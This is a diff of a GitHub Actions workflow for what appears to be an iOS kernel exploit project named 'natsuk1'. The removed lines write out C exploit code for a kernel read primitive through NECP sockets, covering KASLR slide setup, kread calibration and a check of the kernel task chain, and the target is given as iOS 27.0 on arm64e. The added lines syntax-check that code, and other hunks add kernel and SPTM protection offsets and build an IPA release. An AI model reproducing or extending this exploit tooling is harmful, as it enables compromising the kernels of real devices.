-              log_info("TASK", "kernproc pid=%u (expect 0)", pid);
-              return (pid == 0) ? 0 : -1;
-          }
-
-          static volatile int g_busy = 0;
-
-          static int nk_necp_run_impl(void) {
-              nk_log("");
-              nk_log("=== natsuk1 v1.8 (natsuk1-kread-v8-fuzz) ===");
-              nk_log("target: iOS 27.0 / XNU / arm64e");
-              nk_log("");
-              log_info("INIT", "NCF_STRUCT_SZ=0x%x PORTS=%d PER_PORT=%d FUZZ=0..0x%x step=0x%x",
-                       NCF_STRUCT_SZ, NKS1_MAX_PORTS, NKS1_PER_PORT,
-                       FUZZ_MAX_OFF, FUZZ_STEP);
-
-              g_slide = 0x3D00000ULL;
-              g_kbase = KERNEL_BASE_STATIC + g_slide;
-              log_ok("P1", "kbase=0x%llx", (unsigned long long)g_kbase);
-
-              {
-                  int fd = necp_open_fd();
-                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
-                  close(fd);
-                  log_ok("P2", "necp OK");
-              }
-
-              log_info("P3", "calibration");
-              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
-              log_ok("P3", "kread ready (readoff=0x%x)", g_res_off);
-
-              log_info("P4", "sanity");
-              if (sanity_check() != 0) { log_err("P4", "sanity failed"); return 1; }
-              if (task_sanity() != 0) { log_warn("P5", "task chain broken"); }
-
-              log_ok("DONE", "kread complete");
-              return 0;
-          }
-
-          int nk_necp_run(void) {
-              if (__sync_lock_test_and_set(&g_busy, 1)) {
-                  nk_log("[!] already running");
-                  return 1;
-              }
-              int rc = nk_necp_run_impl();
-              __sync_lock_release(&g_busy);
-              return rc;
-          }
-
-          int nk_full_exploit(void) { return nk_necp_run(); }
-          NECP_EOF
+      - name: Verify necp.c syntax
+        run: |
+          set -euo pipefail
+          F=natsuk1/Exploit/necp.c
+          wc -l "$F"
+          test "$(grep -c 'nk_necp_run(void)' "$F")" = "1"
+          test "$(grep -c 'static int impl(void)' "$F")" = "1"
+          test "$(grep -c 'static int trial(uint64_t' "$F")" = "1"
+          test "$(grep -c 'static int fuzz(void)' "$F")" = "1"
+          test "$(grep -c 'static int calibrate(void)' "$F")" = "1"
+          test "$(grep -c 'static uint64_t kr64' "$F")" = "1"
+          test "$(grep -c 'static void dumpw' "$F")" = "1"
+          test "$(grep -c 'natsuk1-kread-v8-fuzz' "$F")" = "1"
+          echo "--- spot checks ---"
+          grep -n 'memcpy(&val, buf + i, 8)' "$F"
+          grep -n 'val >= KPTR_MIN && val <= KPTR_MAX' "$F"
+          echo "--- syntax check ---"
+          HEADER_SEARCH="$(pwd)/natsuk1/Exploit"
+          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
+          clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
+            -I"$HEADER_SEARCH" -Wall -Wno-everything \
+            "$F"
+          echo "syntax OK"
 
       - name: Write Offsets JSON
         run: |
@@ -544,6 +529,7 @@ jobs:
               "off_zone_site_struct_pipe": "0xFFFFFFF007C6FE80",
               "off_zone_site_struct_vm_page": "0xFFFFFFF007C64C80",
               "off_sptm_base": "0xFFFFFFF027004000",
+              "off_sptm_ctrl_lock_boot": "0xFFFFFFF027006E62",
               "off_sptm_ctrr_lock_boot": "0xFFFFFFF027006E62",
               "off_sptm_cpu_lock_system_registers": "0xFFFFFFF0270B39B4",
               "off_sptm_determine_kernel_ctrr": "0xFFFFFFF0270B2224",
@@ -622,7 +608,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v8: fuzz NCF_ASSIGNED_OFF 0x00..0x200"
+            --notes "kread v8-fuzz: NCF_ASSIGNED_OFF sweep 0x00..0x200"
 
       - name: Commit
         run: |
